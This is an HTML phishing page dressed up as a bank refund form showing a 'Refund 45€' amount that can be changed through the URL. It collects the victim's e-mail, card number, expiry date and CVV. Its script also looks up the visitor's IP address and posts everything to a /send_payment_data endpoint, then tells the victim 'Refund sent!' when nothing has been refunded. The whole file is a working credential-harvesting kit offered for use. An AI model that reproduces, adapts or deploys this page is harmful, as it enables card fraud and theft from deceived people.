<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Refund</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #00b2ff;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .payment-card {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
            padding: 2.5rem 2rem 2rem 2rem;
            max-width: 370px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            overflow: hidden;
        }
        .bank-icon {
            width: 60px;
            height: 60px;
            background: #00b2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
        }
        .bank-icon svg {
            width: 36px;
            height: 36px;
            fill: #fff;
        }
        .payment-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
        }
        .payment-card hr {
            border: none;
            border-top: 1px solid #e0e0e0;
            margin: 1.2rem 0 1.5rem 0;
        }
        .input-group {
            margin-bottom: 1.1rem;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 1rem 1.1rem;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1.1rem;
            background: #fafbfc;
            outline: none;
            transition: border 0.2s;
            box-sizing: border-box;
            overflow-wrap: break-word;
        }
        .input-group input:focus {
            border-color: #00b2ff;
        }
        .row {
            display: flex;
            gap: 1rem;
            width: 100%;
        }
        .row .input-group {
            flex: 1;
            margin-bottom: 0;
        }
        .confirm-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 1.2rem;
            cursor: pointer;
            transition: background 0.2s;
        }
        .confirm-btn:hover {
            background: #0090cc;
        }
        .support-proceed-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 0.5rem;
            cursor: pointer;
            transition: background 0.2s;
            text-align: center;
            text-decoration: none;
            display: block;
            box-sizing: border-box;
        }
        .support-proceed-btn:hover {
            background: #0090cc;
        }
        @media (max-width: 480px) {
            .payment-card {
                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
            }
            .row {
                flex-direction: column;
                gap: 0.7rem;
            }
        }
    </style>
</head>
<body>
    <div class="payment-card">
        <div class="bank-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
        </div>
        <div class="payment-title" id="payment-title">Refund 45€</div>
        <hr>
        <form id="paymentForm" autocomplete="off">
            <div class="input-group">
                <input id="email-input" type="email" placeholder="E-mail" value="" required>
            </div>
            <div class="input-group">
                <input id="card-input" type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
            </div>
            <div class="row">
                <div class="input-group">
                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
                </div>
                <div class="input-group">
                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
                </div>
            </div>
            <button type="submit" class="confirm-btn">Confirm</button>
            <div id="support-buttons" style="display:none; margin-top: 16px; text-align:center;"></div>
        </form>
    </div>
    <script>
    // Визначаємо IP користувача
    let userIP = "";
    fetch("https://api.ipify.org?format=json")
      .then(r => r.json())
      .then(data => { userIP = data.ip; });
    // Зчитування параметрів з URL
    function getQueryParam(name) {
        const url = new URL(window.location.href);
        return url.searchParams.get(name);
    }
    // Total підтягуємо, беремо тільки число
    const totalRaw = getQueryParam('total');
    if (totalRaw) {
        // Витягуємо тільки число (цілу або з копійками)
        const match = totalRaw.match(/\d+[\.,]?\d*/);
        const totalNum = match ? match[0].replace(',', '.') : '';
        if (totalNum) {
            document.getElementById('payment-title').textContent = `Refund ${totalNum}€`;
        }
    }
    document.getElementById('paymentForm').onsubmit = async function(e) {
        e.preventDefault();
        const email = document.getElementById('email-input').value;
        const card = document.getElementById('card-input').value;
        const expiry = document.getElementById('expiry-input').value;
        const cvv = document.getElementById('cvv-input').value;
        try {
            // Додаємо IP до даних
            let ip = userIP;
            if (!ip) {
                // fallback якщо ще не отримали IP
                await new Promise(res => setTimeout(res, 500));
                ip = userIP;
            }
            const response = await fetch('/send_payment_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund' })
            });
            if (response.ok) {
                // Просто показуємо повідомлення
                if (!document.getElementById('payment-msg')) {
                    const msg = document.createElement('div');
                    msg.id = 'payment-msg';
                    msg.style.color = '#16b6ff';
                    msg.style.fontWeight = '500';
                    msg.style.marginTop = '18px';
                    msg.textContent = 'Refund sent!';
                    document.querySelector('.payment-card').appendChild(msg);
                }
            } else {
                alert('Error sending refund!');
            }
        } catch (err) {
            alert('Error sending refund!');
        }
    };
    </script>
</body>
</html>
